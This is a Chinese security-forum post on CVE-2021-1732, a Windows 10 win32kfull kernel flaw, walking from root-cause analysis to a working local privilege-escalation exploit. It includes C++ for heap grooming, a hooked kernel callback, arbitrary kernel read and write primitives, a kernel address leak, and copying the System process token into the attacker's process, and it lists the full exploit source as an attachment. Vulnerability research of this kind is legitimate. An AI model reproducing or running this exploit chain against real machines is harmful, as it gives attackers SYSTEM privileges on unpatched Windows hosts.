> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-266362.htm)

        **CVE-2021-1732 Microsoft Windows10 本地提权漏研究及 Poc/Exploit 开发**

分析及开发涉及到的工具，Ida pro、Windbg、Visual studio 2019，使用环境 Windows 10 Version 1809 x64.

### 1. 漏洞描述

*   漏洞发生在 Windows 图形驱动 win32kfull!NtUserCreateWindowEx 函数中的一处内核回调用户态分配内存与 tagWND->flag 属性设置不同步导致的漏洞。使得可以伪造这个 tagWND->offset 值发生内存越界。
    
*   当驱动 win32kfull.sys 调用 NtUserCreateWindowEx 创建窗口时会判断 tagWND->cbWndExtra(窗口实例额外分配内存数)，该值不为空时调用 win32kfull!xxxClientAllocWindowClassExtraBytes 函数回调用户层 user32.dll!__xxxClientAllocWindowClassExtraBytes 分配空间，分配后的地址使用 NtCallbackReturn 函数修正堆栈后重新返回内核层并保存并继续运行，而当 tagWND->flag 值包含 0x800 属性后该保存值变成了一个 offset。
    
*   攻击者可以 Hook user32.dll!_xxxClientAllocWindowClassExtraBytes 函数调用 NtUserConsoleControl 修改 tagWND->flag 包含 0x800 属性值后使用 NtCallbackReturn 返回一个自定义的值到内核 tagWND->offset。
    

### 2. 受影响系统及应用版本

Windows Server, version 20H2 (Server Core Installation)  
Windows 10 Version 20H2 for ARM64-based Systems  
Windows 10 Version 20H2 for 32-bit Systems  
Windows 10 Version 20H2 for x64-based Systems  
Windows Server, version 2004 (Server Core installation)  
Windows 10 Version 2004 for x64-based Systems  
Windows 10 Version 2004 for ARM64-based Systems  
Windows 10 Version 2004 for 32-bit Systems  
Windows Server, version 1909 (Server Core installation)  
Windows 10 Version 1909 for ARM64-based Systems  
Windows 10 Version 1909 for x64-based Systems  
Windows 10 Version 1909 for 32-bit Systems  
Windows Server 2019 (Server Core installation)  
Windows Server 2019  
Windows 10 Version 1809 for ARM64-based Systems  
Windows 10 Version 1809 for x64-based Systems  
Windows 10 Version 1809 for 32-bit Systems  
Windows 10 Version 1803 for ARM64-based Systems  
Windows 10 Version 1803 for x64-based Systems

### 3. Exploit 攻击效果图

Windows 10 Version 1809 for x64

![](https://bbs.pediy.com/upload/attach/202103/17853_49VDD95SDW2NP2E.jpg)

### 4. 漏洞技术原理

1.  漏洞发生在 Windows 图形驱动 win32kfull!NtUserCreateWindowEx 中。
    
2.  当驱动 win32kfull.sys 调用 NtUserCreateWindowEx 创建窗口时会判断 tagWND->cbWndExtra(窗口实例额外分配内存数)，该值不为空时调用 win32kfull!xxxClientAllocWindowClassExtraBytes 函数回调用户层 user32.dll!__xxxClientAllocWindowClassExtraBytes 创建内存，分配后的地址使用 NtCallbackReturn 函数修正堆栈后重新返回内核层并保存并继续运行，而当 tagWND->flag 值包含 0x800 属性时候对该值采用 offset 寻址。
    
3.  使用 NtUserConsoleControl 修改 flag 包含 0x800 属性。
    

### 5. 细节分析之 POC 开发

#### 1. win32kfull!NtUserCreateWindowEx 漏洞关键点

win32kfull!NtUserCreateWindowEx 创建窗口时会判断 tagWND->cbWndExtra(窗口实例额外分配内存数)，该值不为空时调用 win32kfull!xxxClientAllocWindowClassExtraBytes 函数分配内存返回分配地址。![](https://bbs.pediy.com/upload/attach/202103/17853_5VVKZA3E5UYMQZZ.jpg)图中我们可以看见偏移 0xC8 为 tagWND->cbWndExtra, 偏移 0x128 为 tagWND->offset 保存分配内存地址。

#### 2. win32kfull!xxxClientAllocWindowClassExtraBytes 函数分析:![](https://bbs.pediy.com/upload/attach/202103/17853_97K96R4Q4BJSW44.jpg)

*   KeUserModeCallback 使用编号 123 回调用户层 user32.dll 中的 KernelCallbackTable 表中函数 user32.dll!_xxxClientAllocWindowClassExtraBytes。
    
*   31 行代码中返回信息第一个指针类型指向的就是用户层分配内存地址。驱动调用 ProbeForRead 函数进行验证，该函数判断地址 + 长度小于 MmUserProbeAddress 就行。
    
*   输入到用户层参数是需分配内存大小，长度 4 字节。
    
*   **返回信息长度必须为 0x18 字节。**
    
*   **返回的地址 + 长度小于 MmUserProbeAddress。**
    
*   **当 win32kfull!xxxCreateWindowEx 调用 win32kfull!xxxClientAllocWindowClassExtraBytes 后并没有重新设置这个 flag, 用户可以伪装一个小于 MmUserProbeAddress 任意值进行越界写入 (一次性)。**
    

#### 3. win32kfull!xxxConsoleControl 设置 flag 包含 0x800 属性:![](https://bbs.pediy.com/upload/attach/202103/17853_7YW76JC8SDREUA2.jpg)

图中我们可以看得出偏移 0xE8 是一个 flag。

*   当 flag 值包含 0x800 属性时候偏移 0x128 保存得分配内存地址变成了 offset 寻址。
    
*   当 flag 值不包含 0x800 属性则重新分配内存并设置偏移 0x128 改成 offset 寻址。
    
*   第 152 行代码设置 flag 值包含 0x800 属性。
    

#### 4. win32kfull!NtConsoleControl 函数分析:

NtConsoleControl 该函数为未公开函数，我们需要结合分析进行后续调用。

1.  NtConsoleControl
    
    ![](https://bbs.pediy.com/upload/attach/202103/17853_BW9VX537CXXXHPS.jpg)
    

*   输入参数 1：功能序号，小于等于 6
    
*   输入参数 2：输入信息
    
*   输入参数 3：输入信息长度小于等于 0x18
    

3.  xxxConsoleControl
    
    ![](https://bbs.pediy.com/upload/attach/202103/17853_MB8FS2MHCU8M7DM.jpg)  
    

*   **第 102 行代码处 nIndex == 6 编号是修改 flag 属性包含 0x800 功能地方。**
    
*   **第 104 行代码处判断输入信息长度必须为 0x10。**
    
*   **第 106 行代码处获取输入信息第一个位置为 HWND 是窗口句柄。**
    
*   **第 152 行代码处用传入的 HWND 调用 ValidateHwnd 转换成内核 tagWND 结构后偏移 0x28(内核 tagWND 映射到用户层地址) 中修改 flag 值包含 0x800 属性。**
    

#### 5. user32!_xxxClientAllocWindowClassExtraBytes 函数分析：![](https://bbs.pediy.com/upload/attach/202103/17853_SKT57STWXFBYHJD.jpg)

@2 提到内核 win32kfull!xxxClientAllocWindowClassExtraBytes 会调用 KeUserModeCallback 进入用户模式回调。返回信息的长度必须为 0x18 字节。user32!_xxxClientAllocWindowClassExtraBytes 函数分配后的地址使用 NtCallbackReturn 函数修正堆栈后重新返回内核层并保存并继续运行。

NtCallbackReturn 的函数原型 NTSTATUS __stdcall NtCallbackReturn(PVOID Result, ULONG ResultLength, NTSTATUS Status)  
**第 8 行代码我们可以看出 NtCallbackReturn 返回了长度 0x18 的数据，数据第一个 8 字节是分配后的地址。**

#### 6. win32kfull!NtUserCreateWindowEx 漏洞流程图![](https://bbs.pediy.com/upload/attach/202103/17853_VWU2JAMEBYAJGGS.jpg)

漏洞 Attack 流程图我们可以看出只要 Hook user32!_xxxClientAllocWindowClassExtraBytes 中调用 NtUserConsoleControl 跟 NtCallbackReturn 就行。  
@3 提到调用 NtUserConsoleControl 会重新设置 tagWND->offset 跟 tagWND->flag 值包含 0x800 属性， flag 值包含 0x800 属性采用 offset 寻址。我们在当前调用 NtUserConsoleControl 的目的就是修改 tagWND->flag 值包含 0x800 属性,  再调用 NtCallbackReturn 函数返回指定值目的是重新修改 tagWND->offset, 因为 win32kfull!xxxClientAllocWindowClassExtraBytes 会把返回值放入到 tagWND->offset。

#### 7. 构造 POC

系统创建一个窗口流程：  
   1. 应用程序创建一个窗口会调用 user32!CreateWindow/Ex 函数。  
   2. 使用 user32u!ZwUserCreateWindowEx 函数进入内核模式。  
   3. 内核驱动 win32kXX!NtUserCreateWindowEx 从 Desktop heap 分配窗口对象 tagWND, 并以窗口的句柄（HWND）类型返回给调用方。。。。  
窗口管理简介：从 Windows Vista 开始，每个 Session 是隔离的，Session 0（是一个特殊 session）运行着系统服务，应用程序运行在由用户登录系统后创建的一系列 Session 中。Session 1 对应于第一个登陆的用户，Session 2 对应于第二个登录系统的用户，以此类推；每个系统 Desktop 对象都有 heap 与之对应，Desktop 对象使用 heap 存储菜单、窗体等。  这里不多介绍。

1.  **难点**： @4 提到 win32kfull!NtUserConsoleControl 需要传入窗口句柄，使用句柄调用 ValidateHwnd 转换成对象后修改 tagWND->flag；可漏洞需要在调用 CreateWindowEx 过程里调用 NtUserConsoleControl，此时 CreateWindowEx 并没有返回 HWND！！！
    
2.  分析 win32kfull!NtCreateWindowEx 的 HWND 的创建过程。  
    2.1    
    ![](https://bbs.pediy.com/upload/attach/202103/17853_4CMU6U2CADRNME6.jpg)
    
    2.2 分析 win32kbase!HMAllocObject  
    ![](https://bbs.pediy.com/upload/attach/202103/17853_H6MSAKWF5MRHFB2.jpg)  
    第 204 行代码可以看出 HMAllocObject 调用 Type 类型为 Window 时所采用 DesktopAlloc 桌面堆进行分配。
    
    2.3 User32!HMValidateHandle 函数
    

*   HMAllocObject 创建了桌面堆类型句柄后，会把 tagWND 对象放入到内核模式到用户模式内存映射地址里。 为了验证句柄的有效性，窗口管理器会调用 User32!HMValidateHandle 函数读取这个表。函数将句柄和句柄类型作为参数，并在句柄表中查找对应的项。如果查找到对象, 会返回 tagWND 只读映射的对象指针，通过 tagWND 这个对象我们可以获取到句柄等一系列窗口信息。
    
*   HMValidateHandle 是个未公开函数，可以用 IsMenu 第一个 call 定位此函数。
    

*   **第 179 行代码可以看出 tagWnd + 0 保存着创建句柄。**
    
*   **第 180 行代码可以看出 tagWnd + 8 位置保存着 tagWND 地址与桌面堆地址的偏移。**
    

*   第 526 行代码我们可以看出系统使用 HMAllocObject 创建 tagWND，其参数分别为 pticurrent 当前线程信息 ,Object 为 ptiCurrent->rpdesk，Type 类型 1 为 Window, 空间大小 (此类型无意义，会使用用户句柄表获取类型大小)
    
*   第 540 行代码是一些对 tagWND 信息初始化。
    

6.  **难点解决**  
    好在回调 user32!_xxxClientAllocWindowClassExtraBytes 函数时候内核已经调用完了 win32kbase!HMAllocObject，此时 HWND 已经存放在内存之中。**我们可以创建足够多的窗口让其泄露 tagWND 映射的对象指针，然后再摧毁大多数窗口使得桌面堆能回收这些对象空间。目前我们已经获取了这些休闲的对象地址，当我们再创建一个窗口时候桌面堆会优先使用休闲空间，我们只需要在 hook user32!_xxxClientAllocWindowClassExtraBytes 时候搜索查找刚刚摧毁掉的窗口 tagWND 指针，根据一些特征识别指定窗口就能或者到 HWND 了！！！**
    
7.  POC 开发关键代码
    

```
        //alloc 50 desktop heap address
        for (int i = 0; i < 50; i++) {
            g_hWnd[i] = CreateWindowEx(NULL, L"Class1", NULL, WS_VISIBLE, 0, 0, 1, 1, NULL, hMenu, hInstance, NULL);
            g_pWnd[i] = (ULONG_PTR)fHMValidateHandle(g_hWnd[i], 1); //Get leak kernel mapping desktop heap address
        }
        //free 48 desktop heap address
        for (int i = 2; i < 50; i++) {
            if (g_hWnd[i] != NULL) {
                DestroyWindow((HWND)g_hWnd[i]);
            }
        }
         
NTSTATUS WINAPI MyxxxClientAllocWindowClassExtraBytes(unsigned int* pSize)
{
    if (*pSize == g_dwMyWndExtra) {
        ULONG_PTR ChangeOffset = 0;
 
        HWND hWnd2 = NULL;
 
        //Search free 50 kernel mapping desktop heap (cbwndextra == g_dwMyWndExtra) points to hWnd
        for (int i = 2; i < 48; i++) {
            ULONG_PTR cbWndExtra = *(ULONG_PTR*)(g_pWnd[i] + g_cbWndExtra_offset);
            if (cbWndExtra == g_dwMyWndExtra) {
                hWnd2 = (HWND)*(ULONG_PTR*)(g_pWnd[i]); //Found the "class2" window handle
                break;
            }
        }/**/
        if (hWnd2 == NULL) {
            //Found fail.
            std::cout << "Search free 48 kernel mapping desktop heap (cbwndextra == g_dwMyWndExtra) points to hWnd fail." << std::endl;
        }
        else {
            std::cout << "Search kernel mapping desktop heap points to hWnd: " << std::hex << hWnd2 << std::endl;
        }
 
        ULONG_PTR ConsoleCtrlInfo[2] = { 0 };
        ConsoleCtrlInfo[0] = (ULONG_PTR)hWnd2;
        ConsoleCtrlInfo[1] = ChangeOffset;
        NTSTATUS ret = g_fNtUserConsoleControl(6, (ULONG_PTR)&ConsoleCtrlInfo, sizeof(ConsoleCtrlInfo));
 
        ULONG_PTR Result[3] = { 0 };
        Result[0] = g_dwpWndKernel_heap_offset0;
        return g_fFNtCallbackReturn(&Result, sizeof(Result), 0);
    }
    return g_fxxxClientAllocWindowClassExtraBytes(pSize);
}

```

### 6. 细节分析之 Exploit 开发

此时我们已经能复现漏洞 POC，但是距离开发 Exploit 利用还有很长距离，因为我们还不能读写内核内存，也不知道内核内存位置。我们还需要内核地址泄露跟如何读写内核。  
因为要根据 HWND 操作内核，所以我们重点应该分析相应以 HWND 为参数的设置型函数。

#### 1.  分析 win32kfull!NtSetWindowLong 解除限制：![](https://bbs.pediy.com/upload/attach/202103/17853_4KPGN2EQGFRGP25.jpg)

*   第 114 行代码可以看出调用 User32!SetWindowLong 函数时候输入的第二个参数 nIndex 必须小于偏移 0xC8(tagWND->cbWndExtra), 不然就返回错误代码 0x585。**
    
*   **第 153 行代码可以看出如果 tagWND->flag 值包含 0x800 属性使用 offset 寻址。**
    
*   **第 154 行代码可以看出是使用 offset 寻址。**
    
*   **第 156 行代码可以看出是使用内存地址。**
    
*   **第 157/158 行代码可以看出是替换设置的新值。**
    

从代码看 tagWND->flag 值包含 0x800 属性情况下只要我们有办法把 tagWND->cbWndExtra 改成一个很大很大值 (0xFFFFFFFF) 就可以使用桌面堆加 nIndex 来写入指定堆地址（把这个值改成最大是为了更安全防止碰到偏移过大）。

**前面 @7 3.2.2 提到 tagWND->8 地址里包含内核 tagWND 地址与桌面堆地址的偏移，漏洞可以一次性控制偏移 0x128 的 tagWND->offset，这样只需要把一个正常窗口的 (tagWND->8, 内核 tagWND 地址与桌面堆地址的偏移) 放到漏洞窗口里，我们对漏洞窗口做 nIndex(tagWND->cbWndExtra 大小内) 操作就能修改正常窗口里的 tagWND->“nIndex”信息，解除 tagWND->cbWndExtra 长度过小限制后，我们用这个解除限制的窗口操作 nIndex 可以对其他窗口桌面堆实现越界写入。**

#### 2. 封装内核写接口：

@6.1 我们已经可以修改指定窗口 tagWND 信息，用内存越界方式写入一个 tagWND->flag 值不包含 0x800 属性窗口把偏移 0x128(g_dwModifyOffset_offset) 改成想要写入的地址，然后用 nIndex==0 操作这个 tagWND->flag 值不包含 0x800 属性窗口就能实现内核写入。  
我们可以对 tagWND 进行修改后可以使用很多 API 进行读写，不局限于 SetWindowLongPtr。

```
LONG_PTR WriteQWORD(LONG_PTR pAddress, LONG_PTR value)
{
    LONG_PTR old = SetWindowLongPtr(g_hWnd[0], dwpWnd0_to_pWnd1_kernel_heap_offset + g_dwModifyOffset_offset, (LONG_PTR)pAddress);
    SetWindowLongPtr(g_hWnd[1], 0, (LONG_PTR)value);  //Modify offset to memory address
    return old;
}

```

#### 3. 封装内核读接口：

我们使用的是 User32!GetMenuBarInfo 函数进行内核读取，因为可以读取 16 个字节（我们使用其中 8 字节），使用 User32!GetMenuBarInfo 函数进行内核读取需要控制 tagWND->spmenu, 所以我们替换了 spmenu。

可以对 tagWND 进行修改后可以使用很多 API 进行读写，不局限于 User32!GetMenuBarInfo。

##### 1. Win32kfull!NtUserGetMenuBarInfo 利用分析：![](https://bbs.pediy.com/upload/attach/202103/17853_PUQRCS6E7FVYA5J.jpg)

*   **第 87 行代码可以看出参数 idObject 需要传入一个 - 3。**
    
*   **第 89 代码处对 tagWnd->Style 做了判断不能包含 WS_CHILD。**
    
*   **第 91 行代码处获取 tagWND->spmenu 信息。**
    
*   **第 104 行代码处参数 idItem 需要传入一个大于 0 值。**
    
*   **第 109 行代码处是一个 tagWND->spmenu->rgItems 指针。**
    
*   **第 118/120/… 行代码处是根据 tagWND->spmenu->rgItems 指针内容读取偏移信息。**  
    满足上面条件后才能实现任意读取内存信息。
    

##### 2. 创建虚假的 spmenu 对象：

```
//My spmenu memory struct For read kernel memory
g_pMyMenu = (ULONG_PTR)g_fRtlAllocateHeap((PVOID) * (ULONG_PTR*)(__readgsqword(0x60) + 0x30), 0, 0xA0);
*(ULONG_PTR*)((PBYTE)g_pMyMenu + 0x98) = (ULONG_PTR)g_fRtlAllocateHeap((PVOID) * (ULONG_PTR*)(__readgsqword(0x60) + 0x30), 0, 0x20);
**(ULONG_PTR**)((PBYTE)g_pMyMenu + 0x98) = g_pMyMenu;
*(ULONG_PTR*)((PBYTE)g_pMyMenu + 0x28) = (ULONG_PTR)g_fRtlAllocateHeap((PVOID) * (ULONG_PTR*)(__readgsqword(0x60) + 0x30), 0, 0x200);
*(ULONG_PTR*)((PBYTE)g_pMyMenu + 0x58) = (ULONG_PTR)g_fRtlAllocateHeap((PVOID) * (ULONG_PTR*)(__readgsqword(0x60) + 0x30), 0, 0x8); //rgItems 1
*(ULONG_PTR*)(*(ULONG_PTR*)((PBYTE)g_pMyMenu + 0x28) + 0x2C) = 1; //cItems 1
*(DWORD*)((PBYTE)g_pMyMenu + 0x40) = 1;
*(DWORD*)((PBYTE)g_pMyMenu + 0x44) = 2;
*(ULONG_PTR*)(*(ULONG_PTR*)((PBYTE)g_pMyMenu + 0x58)) = 0x4141414141414141;

```

##### 3. 控制 User32!GetMenuBarInfo 读取数据：

```
//Read kernel memory for 16 length
void ReadKernelMemoryQQWORD(ULONG_PTR pAddress, ULONG_PTR& ululOutVal1, ULONG_PTR& ululOutVal2)
{
    MENUBARINFO mbi = { 0 };
    mbi.cbSize = sizeof(MENUBARINFO);
 
    RECT Rect = { 0 };
    GetWindowRect(g_hWnd[1], &Rect);
 
    *(ULONG_PTR*)(*(ULONG_PTR*)((PBYTE)g_pMyMenu + 0x58)) = pAddress - 0x40; //0x44 xItem
    GetMenuBarInfo(g_hWnd[1], -3, 1, &mbi);
 
    BYTE pbKernelValue[16] = { 0 };
    *(DWORD*)(pbKernelValue) = mbi.rcBar.left - Rect.left;
    *(DWORD*)(pbKernelValue + 4) = mbi.rcBar.top - Rect.top;
    *(DWORD*)(pbKernelValue + 8) = mbi.rcBar.right - mbi.rcBar.left;
    *(DWORD*)(pbKernelValue + 0xc) = mbi.rcBar.bottom - mbi.rcBar.top;
 
    ululOutVal1 = *(ULONG_PTR*)(pbKernelValue);
    ululOutVal2 = *(ULONG_PTR*)(pbKernelValue + 8);
 
    /*std::cout
        << "ReadKernelMemory ululOutVal1: "
        << std::hex << ululOutVal1
        << " ululOutVal2: "
        << std::hex << ululOutVal2 << std::endl;*/
}

```

#### 4. 获取内核泄露地址：

目前我们可以操作任意内核内存读写，但只能搞搞蓝屏，所有还需要一个内核地址泄露漏洞。

经过分析，窗口中菜单 spmenu 对象包含了内核结构地址。

1.  ##### Win32kfull!xxxSetWindowData 分析：
    
    ##### ![](https://bbs.pediy.com/upload/attach/202103/17853_DAUXA8U8R23Z246.jpg)
    

*   **第 110 行代码可以看出参数 idObject 需要传入一个 - 12。**
    
*   **第 112 代码处对 tagWnd->Style 做了判断包含 WS_CHILD。**
    
*   **第 114 代码处对读取窗口 tagWnd->spmenu 对象。**
    
*   **第 116 代码处对修改窗口 tagWnd->spmenu 对象。**
    

我们需要构造符合上面条件的代码。

```
ULONGLONG ululStyle = *(ULONGLONG*)((PBYTE)g_pWnd[1] + g_dwExStyle_offset);
ululStyle |= 0x4000000000000000L;//WS_CHILD
SetWindowLongPtr(g_hWnd[0], dwpWnd0_to_pWnd1_kernel_heap_offset + g_dwExStyle_offset, ululStyle);  //Modify add style WS_CHILD
 
ULONG_PTR pSPMenu = SetWindowLongPtr(g_hWnd[1], GWLP_ID, (LONG_PTR)g_pMyMenu); //Return leak kernel address and set fake spmenu memory
//pSPMenu leak kernel address, good!!!

```

#### 5. 提升进程权限：

##### 1. 获取我的进程内核 EPROCESS

根据 @6.4 提到的 pSPMenu 对象泄露的内核地址，我们可以从中一步步定位到我的 EProcess。

```
ReadKernelMemoryQQWORD(pSPMenu + 0x18, ululValue1, ululValue2);
ReadKernelMemoryQQWORD(ululValue1 + 0x100, ululValue1, ululValue2);
ReadKernelMemoryQQWORD(ululValue1, ululValue1, ululValue2);
 
ULONG_PTR pMyEProcess = ululValue1;

```

```
2. 修改我的进程EPROCESS权限到System:

```

定位到自己 EPROCESS 后遍历 EPROCESS->ActiveProcessLinks 链表，获取进程 ID 为 4 的进程后复制该进程的 Token 到我的 Token。

```
std::cout << "Get current kernel eprocess: " << pMyEProcess << std::endl;
 
ULONG_PTR pSystemEProcess = 0;
 
ULONG_PTR pNextEProcess = pMyEProcess;
for (int i = 0; i < 500; i++) {
    ReadKernelMemoryQQWORD(pNextEProcess + g_dwEPROCESS_ActiveProcessLinks_offset, ululValue1, ululValue2);
    pNextEProcess = ululValue1 - g_dwEPROCESS_ActiveProcessLinks_offset;
 
    ReadKernelMemoryQQWORD(pNextEProcess + g_dwEPROCESS_UniqueProcessId_offset, ululValue1, ululValue2);
 
    ULONG_PTR nProcessId = ululValue1;
    if (nProcessId == 4) { // System process id
        pSystemEProcess = pNextEProcess;
        std::cout << "System kernel eprocess: " << std::hex << pSystemEProcess << std::endl;
 
        ReadKernelMemoryQQWORD(pSystemEProcess + g_dwEPROCESS_Token_offset, ululValue1, ululValue2);
        ULONG_PTR pSystemToken = ululValue1;
 
        ULONG_PTR pMyEProcessToken = pMyEProcess + g_dwEPROCESS_Token_offset;
 
        //Write kernel memory
        LONG_PTR old = SetWindowLongPtr(g_hWnd[0], dwpWnd0_to_pWnd1_kernel_heap_offset + g_dwModifyOffset_offset, (LONG_PTR)pMyEProcessToken);
        SetWindowLongPtr(g_hWnd[1], 0, (LONG_PTR)pSystemToken);  //Modify offset to memory address
        SetWindowLongPtr(g_hWnd[0], dwpWnd0_to_pWnd1_kernel_heap_offset + g_dwModifyOffset_offset, (LONG_PTR)old);
        break;
    }
}

```

### 7. 恢复漏洞防止蓝屏

完成提权后对修改过的 tagWND 结构进行恢复。

```
//Recovery bug
g_dwpWndKernel_heap_offset2 = *(ULONG_PTR*)((PBYTE)pWnd2 + g_dwKernel_pWnd_offset);
ULONG_PTR dwpWnd0_to_pWnd2_kernel_heap_offset = *(ULONGLONG*)((PBYTE)g_pWnd[0] + 0x128);
if (dwpWnd0_to_pWnd2_kernel_heap_offset < g_dwpWndKernel_heap_offset2) {
    dwpWnd0_to_pWnd2_kernel_heap_offset = (g_dwpWndKernel_heap_offset2 - dwpWnd0_to_pWnd2_kernel_heap_offset);
 
    DWORD dwFlag = *(ULONGLONG*)((PBYTE)pWnd2 + g_dwModifyOffsetFlag_offset);
    dwFlag &= ~0x800;
    SetWindowLongPtr(g_hWnd[0], dwpWnd0_to_pWnd2_kernel_heap_offset + g_dwModifyOffsetFlag_offset, dwFlag);  //Modify remove flag
 
    PVOID pAlloc = g_fRtlAllocateHeap((PVOID) * (ULONG_PTR*)(__readgsqword(0x60) + 0x30), 0, g_dwMyWndExtra);
    SetWindowLongPtr(g_hWnd[0], dwpWnd0_to_pWnd2_kernel_heap_offset + g_dwModifyOffset_offset, (LONG_PTR)pAlloc);  //Modify offset to memory address
 
 
    ULONGLONG ululStyle = *(ULONGLONG*)((PBYTE)g_pWnd[1] + g_dwExStyle_offset);
    ululStyle |= 0x4000000000000000L;//WS_CHILD
    SetWindowLongPtr(g_hWnd[0], dwpWnd0_to_pWnd1_kernel_heap_offset + g_dwExStyle_offset, ululStyle);  //Modify add style WS_CHILD
 
    ULONG_PTR pMyMenu = SetWindowLongPtr(g_hWnd[1], GWLP_ID, (LONG_PTR)pSPMenu);
    //free pMyMenu
 
    ululStyle &= ~0x4000000000000000L;//WS_CHILD
    SetWindowLongPtr(g_hWnd[0], dwpWnd0_to_pWnd1_kernel_heap_offset + g_dwExStyle_offset, ululStyle);  //Modify Remove Style WS_CHILD
 
    std::cout << "Recovery bug prevent blue screen." << std::endl;
}

```

### 8. 最终我们构造的 Exploit 代码为：

```
附件.

```

[看雪学院推出的专业资质证书《看雪安卓应用安全能力认证 v1.0》（中级和高级）！](https://bbs.pediy.com/thread-265424.htm)

最后于 1 天前 被 KernelKiller 编辑 ，原因：

上传的附件：

*   [CVE-2021-1732 研究及 Exploit 开发. pdf](javascript:void(0)) （892.45kb，69 次下载）
*   [CVE-2021-1732_Exploit.cpp](javascript:void(0)) （15.85kb，75 次下载）